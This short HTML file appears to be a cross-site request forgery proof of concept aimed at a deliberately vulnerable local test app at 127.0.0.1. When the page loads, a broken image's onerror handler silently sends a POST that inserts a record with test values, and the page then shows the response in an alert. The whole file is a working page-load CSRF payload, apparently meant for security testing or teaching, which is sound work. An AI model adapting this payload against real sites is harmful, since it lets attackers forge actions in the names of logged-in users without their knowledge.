<!DOCTYPE html>
<html>
<head>
<script src="jquery-1.11.1.min.js"></script>
<script>
	function CSRFRequest(){
		$.post("http://127.0.0.1/Vulnweb/Case20-INSERT.php",
    {
      username:"CSRFTestUser",
      description:"Test CSRF OK!"
    },
    function(data,status){
      alert("Return: " + data + "\nStatus£º" + status);
    });
	}
</script>
</head>

<body>
<h2>CSRF Test</h2>
<p>Here it will display a false image which shows nothing.</p>
<img src=0 onerror="CSRFRequest()" />
</body>
</html>